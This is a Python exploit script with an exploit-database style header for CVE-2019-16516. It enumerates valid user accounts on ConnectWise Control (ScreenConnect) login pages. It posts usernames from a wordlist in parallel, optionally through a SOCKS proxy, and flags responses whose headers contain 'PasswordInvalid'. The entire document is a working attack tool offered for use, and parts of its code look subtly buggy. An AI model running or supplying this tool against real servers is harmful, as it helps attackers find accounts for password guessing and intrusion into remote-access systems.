#
# Exploit Title: ConnectWise Control is vulnerable to a user enumeration vulnerability, allowing an unauthenticated attacker to determine with certainty if an account exists for a given username.
# Date: Dec 17, 2021
# Exploit Author: Luca Cuzzolin aka czz78
# Vendor Homepage: https://www.connectwise.com/
# Version: vulnerable <= 19.2.24707 ??? didn't really understand if they fixed in upper version https://docs.connectwise.com/ConnectWise_Control_Documentation/ConnectWise_Control_release_notes/Release_notes_archive#ConnectWise_Control_2019.5
# CVE : CVE-2019-16516
#
# ScreenConnect user enumeration tool
#
# POC by czz78
#
# https://github.com/czz/ScreenConnect-UserEnum
#
from multiprocessing import Process, Queue
from statistics import mean
from urllib3 import exceptions as urlexcept
import argparse
import math
import re
import requests

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


headers = []

def header_function(header_line):
    headers.append(header_line)


def process_enum(queue, found_queue, wordlist, url, payload, failstr, verbose, proc_id, stop, proxy):
    try:
        # Payload to dictionary
        payload_dict = {}
        for load in payload:
            split_load = load.split(":")
            if split_load[1] != '{USER}':
                payload_dict[split_load[0]] = split_load[1]
            else:
                payload_dict[split_load[0]] = '{USER}'

        # Enumeration
        total = len(wordlist)
        for counter, user in enumerate(wordlist):
            user_payload = dict(payload_dict)
            for key, value in user_payload.items():
                if value == '{USER}':
                    user_payload[key] = user

            dataraw = "".join(['%s=%s&' % (key, value) for (key, value) in user_payload.items()])[:-1]
            headers={"Accept": "*/*" , "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}

            req = requests.request('POST',url,headers=headers,data=dataraw, proxies=proxies)

            x = "".join('{}: {}'.format(k, v) for k, v in req.headers.items())

            if re.search(r"{}".format(failstr), str(x).replace('\n','').replace('\r','')):
                queue.put((proc_id, "FOUND", user))
                found_queue.put((proc_id, "FOUND", user))
                if stop: break
            elif verbose:
                queue.put((proc_id, "TRIED", user))
            queue.put(("PERCENT", proc_id, (counter/total)*100))

    except (urlexcept.NewConnectionError, requests.exceptions.ConnectionError):
        print("[ATTENTION] Connection error on process {}! Try lowering the amount of threads with the -c parameter.".format(proc_id))


if __name__ == "__main__":
    # Arguments
    parser = argparse.ArgumentParser(description="http://example.com/Login user enumeration tool")
    parser.add_argument("url", help="http://example.com/Login")
    parser.add_argument("wordlist", help="username wordlist")
    parser.add_argument("-c", metavar="cnt", type=int, default=10, help="process (thread) count, default 10, too many processes may cause connection problems")
    parser.add_argument("-v", action="store_true", help="verbose mode")
    parser.add_argument("-s", action="store_true", help="stop on first user found")
    parser.add_argument("-p", metavar="proxy", type=str, help="socks4/5 http/https proxy, ex: socks5://127.0.0.1:9050")
    args = parser.parse_args()

    # Arguments to simple variables
    wordlist = args.wordlist
    url = args.url
    payload = ['ctl00%24Main%24userNameBox:{USER}', 'ctl00%24Main%24passwordBox:a', 'ctl00%24Main%24ctl05:Login', '__EVENTTARGET:', '__EVENTARGUMENT:', '__VIEWSTATE:']
    verbose = args.v
    thread_count = args.c
    failstr = "PasswordInvalid"
    stop = args.s
    proxy= args.p

    print(bcolors.HEADER + """
      __   ___  __     ___
|  | |__  |__  |__)   |__  |\ | |  | |\/|
|__| ___| |___ |  \   |___ | \| |__| |  |

ScreenConnect POC by czz78 :)

    """+ bcolors.ENDC);
    print("URL: "+url)
    print("Payload: "+str(payload))
    print("Fail string: "+failstr)
    print("Wordlist: "+wordlist)
    if verbose: print("Verbose mode")
    if stop: print("Will stop on first user found")

    proxies = {'http': '', 'https': ''}
    if proxy:
        proxies = {'http': proxy, 'https': proxy}

    print("Initializing processes...")
    # Distribute wordlist to processes
    wlfile = open(wordlist, "r", encoding="ISO-8859-1")  # or utf-8
    tothread = 0
    wllist = [[] for i in range(thread_count)]
    for user in wlfile:
        wllist[tothread-1].append(user.strip())
        if (tothread < thread_count-1):
            tothread+=1
        else:
            tothread = 0

    # Start processes
    tries_q = Queue()
    found_q = Queue()
    processes = []
    percentage = []
    last_percentage = 0
    for i in range(thread_count):
        p = Process(target=process_enum, args=(tries_q, found_q, wllist[i], url, payload, failstr, verbose, i, stop, proxy))
        processes.append(p)
        percentage.append(0)
        p.start()

    print(bcolors.OKBLUE + "Processes started successfully! Enumerating." + bcolors.ENDC)
    # Main process loop
    initial_count = len(processes)
    while True:
        # Read the process output queue
        try:
            oldest = tries_q.get(False)
            if oldest[0] == 'PERCENT':
                percentage[oldest[1]] = oldest[2]
            elif oldest[1] == 'FOUND':
                print(bcolors.OKGREEN + "[{}] FOUND: {}".format(oldest[0], oldest[2]) + bcolors.ENDC)
            elif verbose:
                print(bcolors.OKCYAN + "[{}] Tried: {}".format(oldest[0], oldest[2]) + bcolors.ENDC)
        except: pass

        # Calculate completion percentage and print if /10
        total_percentage = math.ceil(mean(percentage))
        if total_percentage % 10 == 0 and total_percentage != last_percentage:
            print("{}% complete".format(total_percentage))
            last_percentage = total_percentage

        # Pop dead processes
        for k, p in enumerate(processes):
            if p.is_alive() == False:
                processes.pop(k)

        # Terminate all processes if -s flag is present
        if len(processes) < initial_count and stop:
            for p in processes:
                p.terminate()

        # Print results and terminate self if finished
        if len(processes) == 0:
            print(bcolors.OKBLUE + "EnumUser finished, and these usernames were found:" + bcolors.ENDC)
            while True:
                try:
                    entry = found_q.get(False)
                    print(bcolors.OKGREEN + "[{}] FOUND: {}".format(entry[0], entry[2]) + bcolors.ENDC)
                except:
                    break
            quit()
